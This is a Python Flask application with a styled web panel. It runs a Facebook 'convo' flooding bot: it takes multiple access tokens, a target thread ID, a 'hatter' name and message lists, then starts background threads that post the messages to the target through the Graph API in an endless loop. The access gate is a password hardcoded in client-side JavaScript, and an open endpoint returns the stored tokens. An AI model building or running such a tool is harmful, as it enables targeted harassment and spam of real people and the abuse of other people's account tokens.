from flask import Flask, render_template_string, request, jsonify
import time
import threading
import requests

app = Flask(__name__)

conversations = {}

HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SarFu Rullex Server</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #000;
      color: #fff;
    }
    header {
      background-image: url('https://i.ibb.co/nvzcqdh/481763241-970223151881676-1859266586914038652-n.jpg');
      background-size: cover;
      background-position: center;
      height: 250px;
      display: flex;
      align-items: center;
      justify-content: center;
      text-shadow: 2px 2px 4px #000;
    }
    header h1 {
      font-size: 3em;
      color: yellow;
    }
    nav {
      display: flex;
      justify-content: center;
      gap: 40px;
      padding: 20px;
      background-color: #111;
    }
    nav a {
      text-decoration: none;
      color: red;
      font-weight: bold;
      font-size: 1.2em;
      transition: 0.3s;
    }
    nav a:hover {
      color: yellow;
      transform: scale(1.1);
    }
    section {
      padding: 30px;
      display: none;
    }
    section.active {
      display: block;
    }
    .card {
      background-color: #111;
      padding: 20px;
      border-radius: 10px;
      margin: 20px 0;
      box-shadow: 0 0 10px rgba(255, 0, 0, 0.4);
    }
    .card h2 {
      color: yellow;
    }
    input, select, textarea {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
    }
    button {
      background-color: red;
      color: #fff;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background-color: yellow;
      color: black;
    }
    footer {
      text-align: center;
      padding: 20px;
      background-color: #111;
      color: yellow;
    }
    .teams img {
      height: 100px;
      width: 100px;
      border-radius: 50%;
    }
    .teams div {
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <header><h1>SarFu Rullex</h1></header>
  <nav>
    <a href="#" onclick="showSection('home')">Home</a>
    <a href="#" onclick="requestPassword()">Servers</a>
    <a href="#" onclick="showSection('teams')">My Teams</a>
  </nav>

  <section id="home" class="active">
    <div class="card">
      <h2>View Convo</h2>
      <input type="text" id="viewName" placeholder="Enter convo name...">
      <button onclick="viewConvo()">View</button>
      <div class="output" id="viewOutput"></div>
    </div>
    <div class="card">
      <h2>Resume Convo</h2>
      <input type="text" id="resumeName" placeholder="Enter convo name...">
      <button onclick="resumeConvo()">Resume</button>
      <div class="output" id="resumeOutput"></div>
    </div>
    <div class="card">
      <h2>Stop Convo</h2>
      <input type="text" id="stopName" placeholder="Enter convo name...">
      <button onclick="stopConvo()">Stop</button>
      <div class="output" id="stopOutput"></div>
    </div>
  </section>

  <section id="servers">
    <div class="card">
      <h2>Start Convo</h2>
      <textarea id="tokens" placeholder="Enter token(s), one per line..."></textarea>
      <input type="text" id="target" placeholder="Target ID">
      <input type="text" id="hatter" placeholder="Hatter Name">
      <textarea id="messages" placeholder="Enter message(s), one per line..."></textarea>
      <input type="text" id="speed" placeholder="Message Speed in seconds">
      <input type="text" id="cname" placeholder="Convo Name">
      <button onclick="startConvo()">Start</button>
      <div class="output" id="startOutput"></div>
    </div>
    <div class="card">
      <h2>Active Server Status</h2>
      <p id="status">Your server is online</p>
    </div>
  </section>

  <section id="teams" class="teams">
    <div class="card">
      <img src="https://i.ibb.co/WWndrD0T/481767414-970935001810491-6220678936190020954-n.jpg" alt="Aryan" />
      <h3>

𓆤『٭❲ 𝐀𝐫̽͜ɣ𝐚͢͡ŋ — ː › 🩶 🪽</h3>
      <p>-3:) [[ Throw Me To The Wolves, And
I Will ReTurn Leagiing The Pack ]]=|
web <3 devlpor
User ExiT <3 B-)</p>
    </div>
    <div class="card">
      <img src="https://i.ibb.co/24Fvtws/481515098-1209863837225043-8730609104721614407-n.jpg" alt="Varun" />
      <h3>—⃨̽𝐅ʈ ː※ː†— Ɓ'i̤̚i̤̚ɭɑ X• ⸺̫ᷟ‣⃟'𓆩͙ 🪼 🪽</h3>
      <p>❤️ (y) ; (")> Thə ::[ Crımıınal ]> Larkaa'w :💚:
ՙՙ 𝗯𝝸𝝸ɭɭ𝝰💙💋 𝗢= Dowƞ̽ IInxııd'w =D:) (Y) ____Best Friend</p>
    </div>
  </section>

  <footer>
    made it ArYan.x3 for web development. 2019 @ 2022
  </footer>

  <script>
    function showSection(id) {
      document.querySelectorAll('section').forEach(sec => sec.classList.remove('active'));
      document.getElementById(id).classList.add('active');
    }
    function requestPassword() {
      let pass = prompt("Enter access password:");
      if (pass === "sarfurullex123") showSection('servers');
      else alert("Wrong password!");
    }

    async function startConvo() {
      let res = await fetch('/start', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          tokens: document.getElementById('tokens').value,
          target: document.getElementById('target').value,
          hatter: document.getElementById('hatter').value,
          messages: document.getElementById('messages').value,
          speed: document.getElementById('speed').value,
          cname: document.getElementById('cname').value
        })
      });
      let data = await res.json();
      document.getElementById('startOutput').innerText = data.status;
    }

    async function viewConvo() {
      let name = document.getElementById('viewName').value;
      let res = await fetch('/view/' + name);
      let data = await res.json();
      document.getElementById('viewOutput').innerText = JSON.stringify(data, null, 2);
    }

    async function resumeConvo() {
      let name = document.getElementById('resumeName').value;
      let res = await fetch('/resume/' + name);
      let data = await res.json();
      document.getElementById('resumeOutput').innerText = data.status;
    }

    async function stopConvo() {
      let name = document.getElementById('stopName').value;
      let res = await fetch('/stop/' + name);
      let data = await res.json();
      document.getElementById('stopOutput').innerText = data.status;
    }
  </script>
</body>
</html>
'''

def send_messages_loop(name):
    convo = conversations[name]
    while convo['active']:
        for token in convo['tokens']:
            for msg in convo['messages']:
                url = f"https://graph.facebook.com/v15.0/t_{convo['target']}/"
                payload = {'message': f"{convo['hatter']} : {msg}", 'access_token': token}
                try:
                    res = requests.post(url, data=payload)
                    print(res.text)
                except Exception as e:
                    print("Error:", e)
                time.sleep(convo['speed'])

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/start', methods=['POST'])
def start():
    data = request.json
    name = data['cname']
    conversations[name] = {
        'tokens': data['tokens'].splitlines(),
        'target': data['target'],
        'hatter': data['hatter'],
        'messages': data['messages'].splitlines(),
        'speed': int(data['speed']),
        'active': True
    }
    threading.Thread(target=send_messages_loop, args=(name,), daemon=True).start()
    return jsonify({'status': 'Conversation started'})

@app.route('/view/<name>')
def view(name):
    convo = conversations.get(name)
    if convo:
        return jsonify(convo)
    return jsonify({'error': 'Not found'})

@app.route('/resume/<name>')
def resume(name):
    convo = conversations.get(name)
    if convo:
        convo['active'] = True
        threading.Thread(target=send_messages_loop, args=(name,), daemon=True).start()
        return jsonify({'status': 'Resumed'})
    return jsonify({'error': 'Not found'})

@app.route('/stop/<name>')
def stop(name):
    convo = conversations.get(name)
    if convo:
        convo['active'] = False
        return jsonify({'status': 'Stopped'})
    return jsonify({'error': 'Not found'})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
